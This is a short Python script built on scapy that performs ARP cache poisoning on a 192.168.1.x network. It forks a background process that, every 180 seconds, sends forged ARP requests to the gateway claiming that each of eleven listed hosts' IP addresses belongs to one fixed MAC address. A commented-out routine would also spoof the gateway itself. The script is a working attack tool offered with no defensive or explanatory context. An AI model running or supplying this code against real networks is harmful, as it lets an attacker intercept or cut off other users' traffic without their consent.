#!/usr/bin/python
from scapy.all import *
import os,sys,time
host_list =  ["192.168.1.101","192.168.1.102","192.168.1.103","192.168.1.104","192.168.1.105","192.168.1.106","192.168.1.107","192.168.1.108","192.168.1.109","192.168.1.110","192.168.1.111"]
def send_arp_attack(gateway):
    p = ARP(op=2,psrc=gateway,hwsrc="a8:88:08:ad:f4:bf")
    send(p)
def send_arp_req_with_src(src,gateway):
    p = ARP(op=1,pdst=gateway,psrc=src,hwsrc="a8:88:08:ad:f4:bf")
    #p.show()
    send(p)
if __name__ == "__main__":
    pid = os.fork()
    if pid > 0:
        os.wait()
    elif pid == 0:
        #for i in (1,2,3):
            #os.close(i)
        gateway = "192.168.1.1"
        dell = sys.argv[1]
        if os.name not in ("nt"):
            my_addr = os.popen("ip addr show dev wlan0|grep -w inet|awk '{print $2}'|awk -F '/' '{print $1}'").read()
        elif len(sys.argv) > 2:
            my_addr = sys.argv[1]
        else:
            sys.exit(1)
        while True:
            #send_arp_attack(gateway)
            for s in host_list:
                if s not in (dell,my_addr):
                    send_arp_req_with_src(s,gateway)
            time.sleep(180)
    else:
        pass
